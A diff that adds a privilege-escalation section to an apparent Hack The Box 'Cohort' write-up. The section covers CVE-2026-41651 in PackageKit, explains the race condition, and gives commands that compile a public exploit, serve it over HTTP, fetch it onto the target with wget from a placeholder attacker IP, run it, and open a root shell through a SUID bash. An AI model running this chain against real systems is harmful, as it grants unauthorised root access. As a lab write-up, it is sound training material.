@@ -135,13 +135,59 @@ wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
 <img width="1102" height="296" alt="image" src="https://github.com/user-attachments/assets/3669b273-7054-450c-b879-69c8b0a4d748" />
 
 
+---
+
+Privilege escalation --- CVE-2026-41651 (Pack2TheRoot)
+----------------------------------------------------
+
+[](https://github.com/omchaturvedi0412/htb-writeups-cohort-README.md/blob/main/cohort.md#7-privilege-escalation--cve-2026-41651-pack2theroot)
+
+`systemctl list-units` reveals `packagekit.service` present (D-Bus activated, inactive until called) --- vulnerable to CVE-2026-41651, a TOCTOU (time-of-check/time-of-use) race condition in PackageKit (`packagekitd`) affecting versions 1.0.2--1.3.4.
+
+### Root cause
+
+[](https://github.com/omchaturvedi0412/htb-writeups-cohort-README.md/blob/main/cohort.md#root-cause)
+
+Three chained bugs in `src/pk-transaction.c`:
+
+1.  `InstallFiles()` unconditionally overwrites cached transaction flags/paths with no state check.
+2.  `pk_transaction_set_state()` silently drops backward state transitions.
+3.  `pk_transaction_run()` reads the cached flags at dispatch time, not authorization time.
+4.  Setting the `SIMULATE` flag bypasses the polkit authorization check entirely.
+
+By sending two async D-Bus calls back-to-back --- first `InstallFiles(SIMULATE, dummy)` then immediately `InstallFiles(NONE, malicious_payload)` --- both messages are guaranteed to land before the GLib idle callback fires, deterministically bypassing authentication and causing the malicious `.deb` package to install as root.
+
+### Exploitation
+
+[](https://github.com/omchaturvedi0412/htb-writeups-cohort-README.md/blob/main/cohort.md#exploitation)
+
+The target had no compiler (`gcc` missing), so the exploit was compiled locally and transferred:
+
+```source-shell
+# local machine
+git clone https://github.com/Vozec/CVE-2026-41651.git
+cd CVE-2026-41651
+sudo apt install -y libglib2.0-dev build-essential
+gcc src/cve-2026-41651.c -o cve-2026-41651\
+  $(pkg-config --cflags --libs glib-2.0 gio-2.0 gobject-2.0)
+python3 -m http.server 9002
+```
+
+```source-shell
+# via marimo websocket shell
+cd /tmp/exploit
+wget http://<ATTACKER_IP>:9002/cve-2026-41651 -O cve-2026-41651
+chmod +x cve-2026-41651
+./cve-2026-41651
+```
 
 
+```
+/tmp/.suid_bash -p
+id
+```
 
-
-
-
-
+<img width="1028" height="199" alt="image" src="https://github.com/user-attachments/assets/6750c4f2-6b43-4064-9986-8144b01a4198" />
 
 
 
